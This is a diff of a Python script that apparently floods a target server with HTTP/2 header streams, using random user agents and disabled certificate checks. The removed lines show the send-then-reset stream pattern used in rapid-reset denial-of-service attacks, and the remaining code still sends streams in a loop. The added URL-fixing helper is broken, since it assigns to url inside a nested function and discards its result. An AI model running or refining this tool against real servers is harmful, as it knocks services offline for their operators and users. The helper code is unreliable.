@@ -276,16 +276,19 @@ def main():
             pass
         
         try:
+            def okurl():
+                if url.startswith("http://") or url.startswith("https://"):
+                    pass
+                else:
+                    url = f"http://{url}"
+                    return url
+            okurl()
             us = UserAgent()
             ua = us.random
             ctx = create_default_context(cafile=where())
             ctx.check_hostname = False
             ctx.verify_mode = CERT_NONE
-            try:
-                parsed_url = urlparse(url)
-            except:
-                url = urlunsplit(('http' , url , '' , '' , ''))
-                return url
+            parsed_url = urlparse(url)
             target = parsed_url.netloc
             path = parsed_url.path
             if path == "":
@@ -582,15 +585,13 @@ def main():
                                 ":path": path,
                                 ":scheme": iur,
                                 ":authority": target,
-                                "user-agent": ua.random,
-                                "accept-encoding": "gzip, deflate",
+                                "User-Agent": ua,
+                                "Accept-Encoding": "gzip, deflate",
                                 "encrypted-data": encrypted_data
                             }
                             stream_id = conn.get_next_available_stream_id()
                             conn.send_headers(stream_id , payl)
-                            s.send(conn.data_to_send())
-                            conn.reset_stream(stream_id)
-                            s.send(conn.data_to_send())
+                            s.sendall(conn.data_to_send())
                     except:
                         pass
 
